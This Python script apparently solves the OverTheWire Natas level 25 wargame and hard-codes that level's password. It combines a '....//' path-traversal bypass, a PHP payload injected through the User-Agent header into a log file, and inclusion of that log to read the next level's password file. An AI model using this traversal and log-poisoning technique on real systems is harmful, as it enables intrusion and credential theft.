import sys
import requests as req

username = "natas25"
password = "O9QD9DZBDq1YpswiTM5oqMDaOtuZtAcx"
url = "http://%s.natas.labs.overthewire.org/" % username

headers = {"User-Agent": "<?php global $__GREETING; global $__MSG; global $__FOOTER; $__GREETING=\"Quote\"; $__MSG=\"crap\"; $__FOOTER=file_get_contents('/etc/natas_webpass/natas26'); ?>"}
s = req.session()

r = s.get(url, auth=(username, password))
sessid = r.cookies["PHPSESSID"]
lang = "....//logs/natas25_" + sessid + ".log"
data = {"lang": lang}
r = s.get(url, auth=(username, password), params=data, headers=headers)
print(r.text)
print(r.cookies)
print(r.headers)
print(s.proxies)
